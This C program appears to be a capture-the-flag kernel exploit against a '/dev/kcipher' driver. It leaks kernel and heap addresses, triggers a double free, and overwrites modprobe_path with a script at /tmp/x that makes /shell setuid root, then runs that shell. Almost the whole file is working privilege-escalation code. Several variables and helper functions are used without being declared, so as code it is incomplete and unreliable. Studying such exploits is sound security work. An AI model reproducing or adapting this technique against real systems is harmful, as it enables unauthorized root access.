#define _GNU_SOURCE

#include <stdio.h>
#include <init.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sxattr_uffd.h>

#define CMD 0xEDBEEF00

typedef struct kcipher {
    int type;
    char key;
    char pad[3];
    uint64_t size;
    char *data;
    int pad_4;
    char buf[0x40];
} kcipher;

// int g_fd;
// uint64_t 


int ioctl_device(kcipher *req) {
    return ioctl(g_fd, CMD, req);
}

int cipher_read(char *buf, size_t size) {
    return read(g_fd, buf, size);
}

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\nchown root:root /shell\nchmod a+x /shell\nchmod a+s /shell' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    system("/shell");
}

int main() {
    commit_creds=0x00072030, prepare_kernel_cred=0x000721d0, \
    swapgs_restore_regs_and_return_to_usermode = 0x00401620, modprobe_path=0x008a83a0;
    save_state();
    g_fd = open_c("/dev/kcipher", O_RDWR);
    int fd;

    uint64_t buf[0x60/8];
    memset(buf, 0, sizeof(buf));
    cipher_read(buf, 0x20);
    memset(buf, 'A', 0x20);

    kcipher *req = malloc(sizeof(kcipher));
    kcipher *tmp = req;
    req->type = 0;

    int vt_fd = ioctl_device(req);
    fd = ioctl_device(req);
    if (fd < 0) { log_error("kcipher buf"); }

    int seq = open_c("/proc/self/stat", O_RDONLY);
    close(seq);

    memset(buf, 0, sizeof(buf));
    write(fd, buf, 0x20);
    read(fd, buf, 0x20);

    kbase = buf[1] - 0x15b870;
    heap_base = buf[2] >> 12 << 12;
    info("kernel base", kbase);
    info("heap base", heap_base);
    calc_addr("commit_creds", commit_creds, 1);
    calc_addr("prepare_kernel_cred", prepare_kernel_cred, 1);
    calc_addr("swapgs_restore_regs_and_return_to_usermode", swapgs_restore_regs_and_return_to_usermode, 0);
    calc_addr("modprobe_path", modprobe_path, 1);

    close(fd);
    
    req = mmap(0, 0x1000, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (req == MAP_FAILED) { log_error("mmap fail"); }
    sleep(1);
    ioctl_device(req);
    close(5); // double free
    memset(buf, 'A', sizeof(buf));
    buf[6] = modprobe_path;
    write(vt_fd, buf, 0x60);

    req = tmp;
    fd = ioctl_device(req);
    strcpy(buf, "/tmp/x");
    write(fd, buf, 0x60);

    get_flag();
}